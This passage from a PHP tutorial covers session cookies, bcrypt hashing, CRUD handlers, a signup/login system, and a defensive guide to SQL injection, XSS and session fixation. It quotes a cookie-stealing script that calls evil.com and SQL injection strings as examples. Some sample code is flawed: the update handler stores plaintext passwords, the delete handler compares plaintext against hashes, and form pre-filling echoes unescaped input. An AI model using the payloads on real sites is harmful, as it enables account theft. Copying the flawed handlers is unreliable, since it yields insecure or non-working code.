| `use_strict_mode`        | `1`   | Reject **uninitialized** session IDs — if someone sends a made-up ID, PHP generates a new one |

---

### 17.3 Secure Cookie Parameters

```php
<?php
session_set_cookie_params([
    'lifetime' => 1800,       // 30 minutes
    'domain'   => 'localhost',
    'path'     => '/',
    'secure'   => true,
    'httponly'  => true
]);

session_start();
?>
```

| Parameter  | Value         | Purpose                                                               |
| ---------- | ------------- | --------------------------------------------------------------------- |
| `lifetime` | `1800`        | Cookie expires after 30 minutes of inactivity                         |
| `domain`   | `'localhost'` | Cookie only sent to this domain                                       |
| `path`     | `'/'`         | Cookie available across the entire site                               |
| `secure`   | `true`        | Cookie only sent over **HTTPS** (not plain HTTP)                      |
| `httponly`  | `true`        | Cookie **cannot** be read by JavaScript — prevents XSS cookie theft   |

---

### 17.4 Session ID Regeneration

| **Why**   | Prevents **session fixation attacks** — where an attacker sets a known session ID and waits for the victim to log in with it. |
| --------- | ----------------------------------------------------------------------------------------------------------------------------- |
| **How**   | Call `session_regenerate_id(true)` periodically. The `true` deletes the old session file.                                     |
| **Where** | After login and on a timer (every 30 minutes).                                                                                |

```php
<?php
session_start();

if (!isset($_SESSION['last_regeneration'])) {
    session_regenerate_id(true);
    $_SESSION['last_regeneration'] = time();
} else {
    $interval = 60 * 30;  // 30 minutes
    if (time() - $_SESSION['last_regeneration'] >= $interval) {
        session_regenerate_id(true);
        $_SESSION['last_regeneration'] = time();
    }
}
?>
```

| Function                       | What It Does                                              |
| ------------------------------ | --------------------------------------------------------- |
| `session_regenerate_id(true)`  | Generates new session ID **and** deletes old session file |
| `session_regenerate_id(false)` | Generates new ID but keeps old session (default)          |

> **💡 Best Practice:** Regenerate the session ID on **every login** and every 30 minutes thereafter.

---

### 17.5 Session Security — Complete Config File

```php
<?php
// config_session.inc.php — include this at the top of every page

ini_set('session.use_only_cookies', 1);
ini_set('session.use_strict_mode', 1);

session_set_cookie_params([
    'lifetime' => 1800,
    'domain'   => 'localhost',
    'path'     => '/',
    'secure'   => true,
    'httponly'  => true
]);

session_start();

// Regenerate session ID every 30 minutes
if (!isset($_SESSION['last_regeneration'])) {
    session_regenerate_id(true);
    $_SESSION['last_regeneration'] = time();
} else {
    $interval = 60 * 30;
    if (time() - $_SESSION['last_regeneration'] >= $interval) {
        session_regenerate_id(true);
        $_SESSION['last_regeneration'] = time();
    }
}
?>
```

> **💡 Usage:** `require "config_session.inc.php";` at the top of every page that needs sessions. This replaces a bare `session_start()` call.

---

## 18. 🔑 Password Hashing

### 18.1 Why Hash Passwords?

| **Why**   | If your database is ever hacked, stored passwords are exposed. **Hashing** converts passwords into unreadable strings, so even if leaked, they can't be reversed. |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **How**   | Use `password_hash()` to hash and `password_verify()` to check. **Never** store plaintext passwords.                                                              |
| **Where** | Signup (hash before storing) and Login (verify against stored hash).                                                                                              |

---

### 18.2 `password_hash()` — Hashing a Password

```php
<?php
$plainPassword = "Violet";

$options = [
    'cost' => 12    // 2^12 = 4096 iterations — higher = slower but more secure
];

$hashedPwd = password_hash($plainPassword, PASSWORD_BCRYPT, $options);

echo $hashedPwd;
// Output: $2y$12$randomsaltandhashedstringhere (60 chars)
?>
```

| Parameter          | What It Does                                                         |
| ------------------ | -------------------------------------------------------------------- |
| `$plainPassword`   | The user's raw password                                              |
| `PASSWORD_BCRYPT`  | The hashing algorithm (bcrypt)                                       |
| `PASSWORD_DEFAULT` | Uses the best algorithm available (currently bcrypt, may change)     |
| `'cost' => 12`     | How many times the hash is computed (2^12). Higher = slower & safer  |

> **💡 Pro Tip:** `PASSWORD_DEFAULT` is recommended over `PASSWORD_BCRYPT` because it auto-updates when PHP adds better algorithms. Use `pwd VARCHAR(255)` in your database to accommodate any future algorithm.

---

### 18.3 `password_verify()` — Checking a Password

```php
<?php
$loginPassword = "Violet";
$storedHash = "$2y$12$...";  // Retrieved from database

if (password_verify($loginPassword, $storedHash)) {
    echo "Passwords match!";
} else {
    echo "Wrong password!";
}
?>
```

- `password_verify()` extracts the salt and cost from the stored hash automatically.
- You do **not** need to hash the login password yourself — `password_verify()` handles it.

---

### 18.4 Hashing in a Real Signup Handler

```php
<?php
// formhandler.php — hash BEFORE inserting into database
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $pwd = $_POST["pwd"];
    $email = $_POST["email"];

    try {
        require_once "../../20-connect-db/includes/dbh.inc.php";

        $query = "INSERT INTO users (username, pwd, email) VALUES (:username, :pwd, :email);";
        $stmt = $pdo->prepare($query);

        $options = ['cost' => 12];
        $hashedPwd = password_hash($pwd, PASSWORD_BCRYPT, $options);

        $stmt->bindParam(":username", $username);
        $stmt->bindParam(":pwd", $hashedPwd);   // ← Hashed, not plain!
        $stmt->bindParam(":email", $email);
        $stmt->execute();

        header("Location: ../form.php");
        die();
    } catch (PDOException $e) {
        die("Query failed: " . $e->getMessage());
    }
}
?>
```

---

### 18.5 General-Purpose Hashing (SHA-256 with Salt & Pepper)

For non-password data (API tokens, verification codes), you can use `hash()` with salt and pepper:

```php
<?php
$data = "Violet";
$salt = bin2hex(random_bytes(16));    // Random salt — stored alongside the hash
$pepper = "ASecretPepperString";      // Pepper — stored in code/env (not in DB)

$dataToHash = $data . $salt . $pepper;
$hash = hash("sha256", $dataToHash);

// To verify later:
$verificationHash = hash("sha256", $data . $salt . $pepper);
if ($hash === $verificationHash) {
    echo "Match!";
}
?>
```

| Term       | What It Is                                    | Where Stored    |
| ---------- | --------------------------------------------- | --------------- |
| **Salt**   | Random string added to make each hash unique  | In the database |
| **Pepper** | Secret string known only to the application   | In code or `.env` |
| **Hash**   | The resulting one-way encrypted string         | In the database |

> **⚠️ For passwords, always use `password_hash()` + `password_verify()`.** The `hash()` + salt/pepper approach above is for general-purpose hashing only.

---

### 18.6 Hashing — Quick Reference

| Function                     | Purpose                                  | Use For         |
| ---------------------------- | ---------------------------------------- | --------------- |
| `password_hash($pwd, algo)`  | Hash a password securely                 | Signup          |
| `password_verify($pwd, $hash)` | Check password against stored hash    | Login           |
| `hash("sha256", $data)`      | General one-way hash                     | Tokens, checksums |
| `bin2hex(random_bytes(16))`  | Generate random salt                     | Salt generation |

---

## 19. ✏️ UPDATE & DELETE via PHP

### 19.1 Updating Database Records

| **Why**   | Users need to change their account details (username, password, email, etc.).                       |
| --------- | -------------------------------------------------------------------------------------------------- |
| **How**   | Use a `UPDATE` SQL query with prepared statements. Form submits to a PHP handler that runs the query. |
| **Where** | Account settings pages, admin panels, any "edit" form.                                              |

```php
<?php
// userupdate.inc.php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $pwd = $_POST["pwd"];
    $email = $_POST["email"];

    try {
        require_once "../../20-connect-db/includes/dbh.inc.php";

        $query = "UPDATE users SET username = :username, pwd = :pwd, email = :email WHERE id = 2;";

        $stmt = $pdo->prepare($query);
        $stmt->bindParam(":username", $username);
        $stmt->bindParam(":pwd", $pwd);
        $stmt->bindParam(":email", $email);
        $stmt->execute();

        $pdo = null;
        $stmt = null;

        header("Location: ../form.php");
        die();
    } catch (PDOException $e) {
        die("Query failed: " . $e->getMessage());
    }
} else {
    header("Location: ../form.php");
}
?>
```

**Key parts of the `UPDATE` query:**

| Part | Purpose |
|:---|:---|
| `UPDATE users` | Which table to update |
| `SET col = :val` | Which columns to change and their new values |
| `WHERE id = 2` | Which row(s) to update — **always include WHERE** |

> **⚠️ CRITICAL:** Never omit the `WHERE` clause in an `UPDATE` query. Without it, **every row** in the table gets updated!

---

### 19.2 Deleting Database Records

| **Why**   | Users may want to delete their account, or admins may need to remove records.        |
| --------- | ------------------------------------------------------------------------------------ |
| **How**   | Use a `DELETE FROM` SQL query with prepared statements and a `WHERE` clause.          |
| **Where** | Account deletion, cleanup scripts, admin panels.                                     |

```php
<?php
// userdelete.inc.php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $pwd = $_POST["pwd"];

    try {
        require_once "../../20-connect-db/includes/dbh.inc.php";

        $query = "DELETE FROM users WHERE username = :username AND pwd = :pwd;";

        $stmt = $pdo->prepare($query);
        $stmt->bindParam(":username", $username);
        $stmt->bindParam(":pwd", $pwd);
        $stmt->execute();

        $pdo = null;
        $stmt = null;

        header("Location: ../form.php");
        die();
    } catch (PDOException $e) {
        die("Query failed: " . $e->getMessage());
    }
} else {
    header("Location: ../form.php");
}
?>
```

> **⚠️ CRITICAL:** Never omit the `WHERE` clause in a `DELETE` query. Without it, **every row** in the table gets deleted!

---

### 19.3 The Form (UPDATE & DELETE on Same Page)

```php
<body>
    <h3>Change account</h3>
    <form action="includes/userupdate.inc.php" method="post">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="pwd" placeholder="Password">
        <input type="text" name="email" placeholder="E-Mail">
        <button>Update</button>
    </form>

    <h3>Delete account</h3>
    <form action="includes/userdelete.inc.php" method="post">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="pwd" placeholder="Password">
        <button>Delete</button>
    </form>
</body>
```

---

### 19.4 CRUD Summary (All 4 Operations)

| Operation  | SQL         | PHP Method                      | Lesson |
| ---------- | ----------- | ------------------------------- | ------ |
| **C**reate | `INSERT INTO` | `$pdo->prepare()` + `execute()` | 22     |
| **R**ead   | `SELECT`      | `$stmt->fetchAll()` or `fetch()` | 24    |
| **U**pdate | `UPDATE SET`  | `$pdo->prepare()` + `execute()` | 23     |
| **D**elete | `DELETE FROM` | `$pdo->prepare()` + `execute()` | 23     |

> **All four operations must use prepared statements** to prevent SQL injection.

---

## 20. 🏗️ Login System — Signup (Part 1)

### 20.1 Overview & Architecture

| **Why**   | A signup/login system is the foundation of almost every web application — user accounts, personalization, access control. |
| --------- | ------------------------------------------------------------------------------------------------------------------------ |
| **How**   | Procedural PHP with a **MVC-like pattern**: separate files for Model (DB), View (display), Controller (validation).       |
| **Where** | The `28-login-system-p1/` and `29-login-system-p2/` folders.                                                              |

#### Project Structure (Part 1)

```
28-login-system-p1/
├── index.php                    ← Main page (Login & Signup forms)
├── db.sql                       ← SQL to create the users table
└── includes/
    ├── dbh.inc.php              ← Database connection (PDO)
    ├── config_session.inc.php   ← Session config & security
    ├── signup.inc.php           ← Signup handler (coordinator)
    ├── signup_contr.inc.php     ← Signup controller (validation)
    ├── signup_model.inc.php     ← Signup model (DB queries)
    ├── signup_view.inc.php      ← Signup view (form inputs & errors)
    └── login.inc.php            ← Login handler (empty in Part 1)
```

#### The MVC Pattern

```
┌──────────────┬──────────────┬──────────────────┐
│    MODEL     │     VIEW     │    CONTROLLER    │
│              │              │                  │
│ DB queries   │ HTML output  │ Validation &     │
│              │ & display    │ business logic   │
│              │              │                  │
│ signup_      │ signup_      │ signup_          │
│ model.inc    │ view.inc     │ contr.inc        │
│ .php         │ .php         │ .php             │
└──────────────┴──────────────┴──────────────────┘
```

| Layer          | File                   | Responsibility                                   |
| -------------- | ---------------------- | ------------------------------------------------ |
| **Model**      | `signup_model.inc.php` | Database queries (SELECT, INSERT)                |
| **View**       | `signup_view.inc.php`  | HTML output (form inputs, error messages)        |
| **Controller** | `signup_contr.inc.php` | Validation, business logic (empty? valid email?) |
| **Coordinator** | `signup.inc.php`      | Ties M, V, C together; handles the request flow  |

> **Why MVC?** Each file has **one job**. If there's a DB bug, look in Model. Display bug? Look in View. Separation makes code easier to debug and maintain.

---

### 20.2 Database Table

```sql
CREATE TABLE users (
    id INT(11) NOT NULL AUTO_INCREMENT,
    username VARCHAR(30) NOT NULL,
    pwd VARCHAR(255) NOT NULL,
    email VARCHAR(100) NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIME,
    PRIMARY KEY (id)
);
```

> `pwd` is `VARCHAR(255)` because `password_hash()` outputs ~60 chars for bcrypt, but 255 accommodates future algorithm changes.

---

### 20.3 Signup Flow (Step by Step)

```
User fills form → POST to signup.inc.php
    ↓
Grab $_POST data (username, pwd, email)
    ↓
Require Model, View, Controller files
    ↓
Validate:
  ├── Input empty?        → $errors["empty_input"]
  ├── Email invalid?      → $errors["invalid_email"]
  ├── Username taken? (DB)→ $errors["username_taken"]
  └── Email registered? (DB)→ $errors["email_used"]
    ↓
Errors exist?
  ├── YES → Store errors + form data in $_SESSION → redirect → display errors
  └── NO  → Hash password → INSERT into DB → redirect with ?signup=success
```

---

### 20.4 Controller Functions (`signup_contr.inc.php`)

All use `declare(strict_types=1)` for type safety.

```php
<?php
declare(strict_types=1);

function is_input_empty(string $username, string $pwd, string $email) {
    return empty($username) || empty($pwd) || empty($email);
}

function is_email_invalid(string $email) {
    return !filter_var($email, FILTER_VALIDATE_EMAIL);
}

function is_username_taken(object $pdo, string $username) {
    return (bool) get_username($pdo, $username);  // Calls Model
}

function is_email_registered(object $pdo, string $email) {
    return (bool) get_email($pdo, $email);        // Calls Model
}
?>
```

| Function              | Checks                                            | Calls         |
| --------------------- | ------------------------------------------------- | ------------- |
| `is_input_empty()`    | Are any fields blank?                             | `empty()`     |
| `is_email_invalid()`  | Is the email format wrong?                        | `filter_var()` |
| `is_username_taken()` | Does the username already exist in DB?            | Model         |
| `is_email_registered()` | Does the email already exist in DB?             | Model         |

---

### 20.5 Model Functions (`signup_model.inc.php`)

```php
<?php
declare(strict_types=1);

function get_username(object $pdo, string $username) {
    $query = "SELECT username FROM users WHERE username = :username";
    $stmt = $pdo->prepare($query);
    $stmt->bindParam(":username", $username);
    $stmt->execute();
    return $stmt->fetch(PDO::FETCH_ASSOC);  // Returns array or false
}

function get_email(object $pdo, string $email) {
    $query = "SELECT email FROM users WHERE email = :email";
    $stmt = $pdo->prepare($query);
    $stmt->bindParam(":email", $email);
    $stmt->execute();
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function set_user(object $pdo, string $pwd, string $username, string $email) {
    $query = "INSERT INTO users (username, pwd, email) VALUES (:username, :pwd, :email);";
    $stmt = $pdo->prepare($query);

    $options = ['cost' => 12];
    $hashedPwd = password_hash($pwd, PASSWORD_BCRYPT, $options);

    $stmt->bindParam(":username", $username);
    $stmt->bindParam(":pwd", $hashedPwd);
    $stmt->bindParam(":email", $email);
    $stmt->execute();
}
?>
```

> **Key:** The model is the **only layer** that touches the database. Controller and View never write SQL.

---

### 20.6 View Functions (`signup_view.inc.php`)

#### Pre-filling Form Inputs After Errors

```php
<?php
function signup_inputs() {
    // Pre-fill username (unless username was the error)
    if (isset($_SESSION["signup_data"]["username"]) && !isset($_SESSION["errors_signup"]["username_taken"])) {
        echo '<input type="text" name="username" value="' . $_SESSION["signup_data"]["username"] . '">';
    } else {
        echo '<input type="text" name="username" placeholder="Username">';
    }

    // Password is NEVER pre-filled (security)
    echo '<input type="password" name="pwd" placeholder="Password">';

    // Pre-fill email (unless email was the error)
    if (isset($_SESSION["signup_data"]["email"])
        && !isset($_SESSION["errors_signup"]["email_used"])
        && !isset($_SESSION["errors_signup"]["invalid_email"])) {
        echo '<input type="text" name="email" value="' . $_SESSION["signup_data"]["email"] . '">';
    } else {
        echo '<input type="text" name="email" placeholder="E-Mail">';
    }
}
?>
```

> **Why pre-fill?** Better UX — user doesn't re-type everything. Only the **problematic field** is cleared.

#### Displaying Errors & Success

```php
<?php
function check_signup_errors() {
    if (isset($_SESSION["errors_signup"])) {
        $errors = $_SESSION["errors_signup"];
        foreach ($errors as $error) {
            echo '<p>' . $error . '</p>';
        }
        unset($_SESSION["errors_signup"]);   // Clear after display (flash message)
    } else if (isset($_GET["signup"]) && $_GET["signup"] === "success") {
        echo "<p>SIGNUP SUCCESS!!!</p>";
    }
}
?>
```

- Errors stored in `$_SESSION` → displayed once → `unset()` clears them (flash messages).
- Success detected via `$_GET["signup"]` query parameter in URL.

---

### 20.7 Key Built-in Functions (Part 1)

| Function                      | Purpose                                            |
| ----------------------------- | -------------------------------------------------- |
| `filter_var($val, FILTER_VALIDATE_EMAIL)` | Validates email format               |
| `password_hash($pwd, algo)`  | Hashes a password with bcrypt                      |
| `empty($var)`                 | Returns `true` if empty (`""`, `0`, `null`, etc.)  |
| `isset($var)`                 | Returns `true` if set and not `null`               |
| `unset($var)`                 | Destroys a variable                                |
| `session_start()`             | Starts/resumes a session                           |
| `session_regenerate_id(true)` | Regenerates session ID (prevents fixation)         |
| `header("Location: ...")`    | HTTP redirect                                      |
| `die()` / `exit()`           | Stops script execution                             |

---

## 21. 🔐 Login System — Login & Logout (Part 2)

### 21.1 What's Added in Part 2

| Feature              | New Files                                                                    |
| -------------------- | ---------------------------------------------------------------------------- |
| **Login**            | `login.inc.php`, `login_contr.inc.php`, `login_model.inc.php`, `login_view.inc.php` |
| **Logout**           | `logout.inc.php`                                                             |
| **Conditional UI**   | `index.php` — hides login form when user is already logged in                |

---

### 21.2 Login Flow (Step by Step)

```
User fills login form → POST to login.inc.php
    ↓
Grab $_POST["username"], $_POST["pwd"]
    ↓
Require Model, Controller, View files
    ↓
Validate:
  ├── Input empty?         → $errors["empty_input"]
  ├── Username not found?  → $errors["login_incorrect"]
  └── Password doesn't match hash? → $errors["login_incorrect"]
    ↓
Errors exist?
  ├── YES → Store in $_SESSION → redirect → display errors
  └── NO  → Set session vars (user_id, user_username) → redirect with ?login=success
```

---

### 21.3 Login Controller (`login_contr.inc.php`)

```php
<?php
declare(strict_types=1);

function is_input_empty(string $username, string $pwd) {
    return empty($username) || empty($pwd);
}

function is_username_wrong(bool|array $result) {
    return !$result;   // false = user not found
}

function is_password_wrong(string $pwd, string $hashPwd) {
    return !password_verify($pwd, $hashPwd);
}
?>
```

| Function              | What It Checks                                      |
| --------------------- | --------------------------------------------------- |
| `is_input_empty()`    | Are fields blank?                                   |
| `is_username_wrong()` | DB returned `false` (user not found)                |
| `is_password_wrong()` | `password_verify()` returned `false` (wrong password) |

> **Union Type:** `bool|array $result` — because `PDO::fetch()` returns `false` (bool) when no row is found, or an associative array when found.

---

### 21.4 Login Model (`login_model.inc.php`)

```php
<?php
declare(strict_types=1);

function get_user(object $pdo, string $username) {
    $query = "SELECT * FROM users WHERE username = :username";
    $stmt = $pdo->prepare($query);
    $stmt->bindParam(":username", $username);
    $stmt->execute();
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
?>
```

- Uses `SELECT *` to fetch the **entire** user row (id, username, pwd hash, email, etc.).
- Returns `false` if user doesn't exist.

---

### 21.5 Login Handler — Setting Session Variables

On successful login, `login.inc.php` sets:

```php
<?php
$_SESSION["user_id"] = $result["id"];
$_SESSION["user_username"] = htmlspecialchars($result["username"]);
$_SESSION["last_regeneration"] = time();
?>
```

| Session Variable         | Purpose                                                |
| ------------------------ | ------------------------------------------------------ |
| `user_id`                | Unique user identifier — used to check "is user logged in?" |
| `user_username`          | Display name (sanitized with `htmlspecialchars()`)     |
| `last_regeneration`      | Timestamp for session ID regeneration timer            |

---

### 21.6 Login View (`login_view.inc.php`)

```php
<?php
declare(strict_types=1);

function output_username() {
    if (isset($_SESSION["user_id"])) {
        echo "You are logged in as " . $_SESSION["user_username"];
    } else {
        echo "You are not logged in.";
    }
}

function check_login_errors() {
    if (isset($_SESSION["errors_login"])) {
        $errors = $_SESSION["errors_login"];
        foreach ($errors as $error) {
            echo "<p>" . $error . "</p>";
        }
        unset($_SESSION["errors_login"]);
    } else if (isset($_GET["login"]) && $_GET["login"] === "success") {
        echo "<p>LOGIN SUCCESS!!!</p>";
    }
}
?>
```

---

### 21.7 Conditional Login Form (Show/Hide)

```php
<?php if (!isset($_SESSION["user_id"])) { ?>
    <h3>Login</h3>
    <form action="includes/login.inc.php" method="post">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="pwd" placeholder="Password">
        <button>Login</button>
    </form>
<?php } ?>
```

- Login form **disappears** after the user logs in because `$_SESSION["user_id"]` is now set.
- This is the **close/open PHP tags around HTML** pattern from earlier.

---

### 21.8 Logout Handler (`logout.inc.php`)

```php
<?php
// Must use the SAME cookie params as config_session.inc.php
ini_set('session.use_only_cookies', 1);
ini_set('session.use_strict_mode', 1);

session_set_cookie_params([
    'lifetime' => 1800,
    'domain'   => 'localhost',
    'path'     => '/',
    'secure'   => true,
    'httponly'  => true
]);

session_start();
session_unset();      // Clear all session variables
session_destroy();    // Destroy the session on the server

// Delete the session cookie from the browser
setcookie(session_name(), '', time() - 3600, '/', 'localhost', true, true);

header("Location: ../index.php");
die();
?>
```

| Step | Code | Purpose |
|:---|:---|:---|
| 1 | Same `session_set_cookie_params()` | Must match the params used to create the session |
| 2 | `session_start()` | Resume the existing session |
| 3 | `session_unset()` | Clear all `$_SESSION` data |
| 4 | `session_destroy()` | Destroy the session on the server |
| 5 | `setcookie(... time()-3600 ...)` | Tell the browser to delete the cookie (past expiry) |
| 6 | Redirect + `die()` | Send user to index page |

> **⚠️ Key lesson from bugs:** The logout `session_set_cookie_params()` **must match** the one used in `config_session.inc.php`. If they differ, `session_start()` creates a **new** empty session instead of resuming the existing one.

---

### 21.9 Common Bugs & Lessons

| Bug | Cause | Fix | Lesson |
|:---|:---|:---|:---|
| Login form not disappearing after login | `$_SESSION["user_Id"]` (capital I) vs `$_SESSION["user_id"]` (lowercase) | Fix the case | PHP array keys are **case-sensitive** |
| Logout button not working | `logout.inc.php` missing `session_set_cookie_params()` | Add matching params before `session_start()` | Cookie params must match creation params |
| "Undefined array key" warning | Accessing `$_SESSION["user_id"]` for guest users | Check with `isset()` first | Always guard session access with `isset()` |
| `Session ID cannot be changed when active` | Calling `session_id()` after `session_regenerate_id()` | Remove extra `session_id()` call | Use `session_regenerate_id()` instead of manually setting IDs |
| Stray `?>` rendering on page | Extra `?>` outside PHP tags in mixed HTML/PHP | Remove stray tag | Be careful with PHP tag boundaries |

---

### 21.10 Error Display Pattern (Reused in Signup & Login)

Both signup and login follow the **same flash message pattern**:

```
1. Handler detects errors → stores in $_SESSION["errors_xxx"]
2. Redirects to index.php (POST-Redirect-GET pattern)
3. View function checks isset($_SESSION["errors_xxx"])
4. Loops through errors → echoes as <p> tags
5. unset() clears them so they don't show on next refresh
```

> **Why sessions for errors?** Sessions can store arrays (multiple errors). URL params are visible and manipulable. `unset()` makes errors one-time flash messages.

---

### 21.11 Security Concepts Covered

| Concept                         | Implementation                                              |
| ------------------------------- | ----------------------------------------------------------- |
| **SQL Injection Prevention**    | Prepared statements with `bindParam()`                      |
| **Password Hashing**            | `password_hash()` + `password_verify()` with bcrypt cost 12 |
| **Session Fixation Prevention** | `session_regenerate_id(true)` every 30 minutes              |
| **Session Cookie Security**     | `httponly`, `secure`, `use_only_cookies`, `use_strict_mode`  |
| **XSS Prevention**              | `htmlspecialchars()` on output + `httponly` cookies          |
| **Input Validation**            | `filter_var()` for email, `empty()` for required fields     |

---

## 22. 🛡️ PHP Security — Complete Guide

This section consolidates **every security concept** introduced throughout this tutorial into one place. Security isn't a single feature — it's a mindset applied at every layer of your application.

---

### 22.1 SQL Injection

#### What Is It?

SQL injection happens when user input is placed **directly** into an SQL query. An attacker types malicious SQL into a form field, and your code executes it as part of the query — giving them full control over your database.

#### Why Is It Dangerous?

- An attacker can **read** all data (passwords, emails, private info)
- They can **delete** entire tables (`DROP TABLE users`)
- They can **bypass** login forms
- They can **modify** data (change passwords, grant admin access)

#### Example — Vulnerable Code

```php
<?php
// 🚨 NEVER DO THIS — user input goes directly into the query
$username = $_POST["username"];
$query = "SELECT * FROM users WHERE username = '$username'";
$pdo->query($query);

// If a hacker types:  ' OR '1'='1
// The query becomes:
// SELECT * FROM users WHERE username = '' OR '1'='1'
// This returns ALL users — login bypassed!

// Even worse, they could type:  '; DROP TABLE users; --
// The query becomes:
// SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
// This DELETES your entire users table!
?>
```

#### The Fix — Prepared Statements

Prepared statements **separate** the SQL structure from the data. User input is never treated as SQL code — it's always treated as a plain string value.

```php
<?php
// ✅ SAFE — Positional parameters
$query = "SELECT * FROM users WHERE username = ?;";
$stmt = $pdo->prepare($query);
$stmt->execute([$username]);
// Even if $username = "'; DROP TABLE users; --"
// MySQL treats the ENTIRE string as a literal username, not as SQL

// ✅ SAFE — Named parameters (more readable)
$query = "SELECT * FROM users WHERE username = :username;";
$stmt = $pdo->prepare($query);
$stmt->bindParam(":username", $username);
$stmt->execute();
?>
```

#### How Prepared Statements Work (Under the Hood)

```
Without prepared statements:
  PHP builds: "SELECT * FROM users WHERE username = 'hacker_input'"
  MySQL sees: One combined string → executes ALL of it as SQL

With prepared statements:
  Step 1: PHP sends:  "SELECT * FROM users WHERE username = ?"  → MySQL compiles the STRUCTURE
  Step 2: PHP sends:  "hacker_input"                           → MySQL plugs it in as DATA only
  MySQL NEVER treats the user input as SQL code
```

| Method | Syntax | When to Use |
|:---|:---|:---|
| Positional `?` | `execute([$val1, $val2])` | Simple queries with few params |
| Named `:param` | `bindParam(":param", $var)` | Complex queries, better readability |

> **Rule:** If your query uses **any** variable that came from user input, **you must use a prepared statement**. No exceptions.

---

### 22.2 Cross-Site Scripting (XSS)

#### What Is It?

XSS happens when user-submitted data is displayed in the browser **without sanitization**. An attacker submits HTML or JavaScript through a form, and when that data is later shown to other users, the browser executes it.

#### Why Is It Dangerous?

- Attackers can **steal session cookies** and hijack user accounts
- They can **redirect** users to phishing sites
- They can **modify** what the page displays (fake login forms)
- They can **execute** any JavaScript in the victim's browser

#### Example — Vulnerable Code

```php
<?php
// 🚨 DANGEROUS — raw user data displayed in HTML
$username = $_POST["username"];  // User submitted: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

echo "<h1>Welcome, " . $username . "</h1>";
// The browser renders the <script> tag and EXECUTES the JavaScript!
// The user's session cookie is sent to the attacker's server
?>
```

#### The Fix — `htmlspecialchars()`

```php
<?php
// ✅ SAFE — HTML characters are escaped before display
echo "<h1>Welcome, " . htmlspecialchars($username) . "</h1>";

// If $username = "<script>alert('hacked')</script>"
// Output: <h1>Welcome, &lt;script&gt;alert('hacked')&lt;/script&gt;</h1>
// Browser displays the text literally instead of executing it
?>
```

#### What `htmlspecialchars()` Converts

| Character | Converted To | Why |
|:---|:---|:---|
| `<` | `&lt;` | Prevents opening HTML tags |
| `>` | `&gt;` | Prevents closing HTML tags |
| `&` | `&amp;` | Prevents HTML entities |
| `"` | `&quot;` | Prevents breaking out of attributes |
| `'` | `&#039;` | Prevents breaking out of single-quoted attributes |

#### When to Use It

| Situation | Use `htmlspecialchars()`? | Why |
|:---|:---|:---|
| Displaying data in HTML (echo, templates) | **YES — always** | Prevents XSS |
| Inserting data into the database | **No** | Prepared statements handle DB security |
| Passing data between PHP variables | **No** | No browser involved |

> **Rule:** `htmlspecialchars()` is for **output** (displaying to browser). Prepared statements are for **input** (sending to database). Don't mix them up.

---

### 22.3 Session Hijacking & Session Fixation

#### What Is Session Hijacking?

An attacker steals a user's **session ID** (from cookies, network sniffing, or XSS) and uses it to impersonate them — accessing their account without knowing the password.

#### What Is Session Fixation?

An attacker sets a **known session ID** (e.g., via a crafted URL) and tricks the victim into using it. Once the victim logs in, the attacker uses the same session ID to access their account.

#### Why Is It Dangerous?

- Full account takeover without needing the password
- Attacker appears as the legitimate user to the server
- Can be used to steal data, make purchases, change settings

#### The Fixes

**1. Use cookies only for session IDs (no URL-based sessions):**

```php
<?php
ini_set('session.use_only_cookies', 1);
// Blocks session IDs from being passed in URLs like:
// http://example.com/page.php?PHPSESSID=stolen123
?>
```

**2. Reject uninitialized session IDs:**

```php
<?php
ini_set('session.use_strict_mode', 1);
// If someone sends a made-up session ID, PHP generates a NEW one
// instead of accepting the fake one
?>
```

**3. Secure session cookies:**

```php
<?php
session_set_cookie_params([
    'lifetime' => 1800,       // Expires after 30 minutes
    'domain'   => 'localhost',
    'path'     => '/',
    'secure'   => true,       // Only sent over HTTPS
    'httponly'  => true       // JavaScript CANNOT read this cookie
]);
?>
```

| Parameter | Security Benefit |
|:---|:---|
| `secure => true` | Cookie only sent over HTTPS — prevents network sniffing |
| `httponly => true` | JavaScript can't access `document.cookie` — prevents XSS cookie theft |
| `lifetime => 1800` | Auto-expires after 30 min — limits the window for attacks |

**4. Regenerate session ID periodically:**

```php
<?php
session_regenerate_id(true);
// Generates a new session ID and DELETES the old session file
// Even if an attacker got the old ID, it's now invalid
?>
```

Best practice — regenerate every 30 minutes:

```php
<?php
if (!isset($_SESSION['last_regeneration'])) {
    session_regenerate_id(true);
    $_SESSION['last_regeneration'] = time();
} else {
    $interval = 60 * 30;  // 30 minutes
    if (time() - $_SESSION['last_regeneration'] >= $interval) {
        session_regenerate_id(true);
        $_SESSION['last_regeneration'] = time();
    }
}
?>
```

> **Best Practice:** Also regenerate immediately **after login** to prevent fixation attacks.

---

### 22.4 Password Security

#### Why Not Store Plaintext Passwords?

If your database is breached and passwords are stored in plain text, every user's password is instantly exposed. Hashing makes passwords unreadable — even if leaked, they can't be reversed.

#### The Fix — `password_hash()` + `password_verify()`

**Signup (storing the password):**

```php
<?php
$plainPassword = "UserPassword123";

$options = ['cost' => 12];  // 2^12 = 4096 iterations
$hashedPwd = password_hash($plainPassword, PASSWORD_BCRYPT, $options);

// $hashedPwd = "$2y$12$randomSaltAndHash..." (60 chars)
// Store this in the database, NEVER the plain password
?>
```

**Login (checking the password):**

```php
<?php
$loginPassword = "UserPassword123";   // What the user typed
$storedHash = "$2y$12$...";            // Retrieved from database

if (password_verify($loginPassword, $storedHash)) {
    echo "Password matches — login successful!";
} else {
    echo "Wrong password!";
}
// password_verify() extracts the salt and cost from the hash automatically
// You do NOT hash the login password yourself
?>
```

#### Why bcrypt?

| Feature | Benefit |
|:---|:---|
| **Automatic salt** | Each hash is unique even for the same password |
| **Configurable cost** | Controls how slow/secure the hash is (higher = slower = more secure) |
| **One-way** | Cannot be reversed — you can only verify, not decode |
